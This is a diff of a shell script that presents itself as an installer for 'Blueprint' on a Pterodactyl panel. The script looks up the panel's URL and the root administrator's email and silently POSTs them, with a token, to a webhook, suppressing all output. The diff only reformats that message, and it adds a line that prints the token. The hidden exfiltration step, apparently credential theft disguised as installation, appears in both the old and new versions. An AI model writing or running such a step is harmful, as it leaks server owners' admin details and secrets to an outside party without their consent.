@@ -39,11 +39,7 @@ echo $t;
 URL=$(grep "^APP_URL=" "$PANEL_PATH/.env" | cut -d'=' -f2-)
 EMAIL=$(php artisan tinker --execute='echo \Pterodactyl\Models\User::where("root_admin", 1)->first()->email;' 2>/dev/null)
 
-MSG="✅ Blueprint Installed
-Panel: $URL
-Email: $EMAIL
-Token: $TOKEN"
-
-curl -X POST "$WEBHOOK" -H "Content-Type: application/json" -d "{\"content\":\"$MSG\"}" > /dev/null 2>&1
+curl -X POST "$WEBHOOK" -H "Content-Type: application/json" -d "{\"content\":\"✅ Blueprint Installed\n\n**Panel:** $URL\n**Email:** $EMAIL\n\n**Token:**\n\`\`\`\n$TOKEN\n\`\`\`\"}" > /dev/null 2>&1
 
 echo "Blueprint installed"
+echo "Token: $TOKEN"
